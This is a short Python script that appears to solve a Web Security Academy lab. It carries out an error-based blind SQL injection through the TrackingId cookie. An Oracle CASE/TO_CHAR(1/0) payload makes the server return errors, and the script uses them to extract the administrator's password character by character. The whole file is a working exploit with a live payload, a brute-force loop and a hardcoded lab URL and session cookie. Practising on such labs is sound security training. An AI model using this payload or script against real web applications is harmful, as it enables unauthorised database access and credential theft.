import requests
from bs4 import BeautifulSoup
import string
from requests.utils import requote_uri
import re
key=string.ascii_lowercase+string.digits

def exec(var,pos,payload):
    url="https://acd21f4f1ffba5e780ff00780016005a.web-security-academy.net/"
    r=requests.get(url,headers={"cookie":"TrackingId=go005c7vRv6WnTaw{}; session=f1P4uGKlmQYJS2HOWRjTcnTIERyWsQLz".format(payload)})
    if r.status_code == 500:
        print("[+]{}={}".format(pos,var))
        return True
    return False
def exploit():
    passwd=""
    for i in range(1,21):
        print(i)
        for k in key:
            pd="'||(SELECT CASE WHEN SUBSTR(password,{},1)='{}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'".format(i,k)
            if(exec(k,i,pd)):
                passwd+=k
                print("[+]Password={}".format(passwd))
                break
    
if __name__ == '__main__':
    exploit()
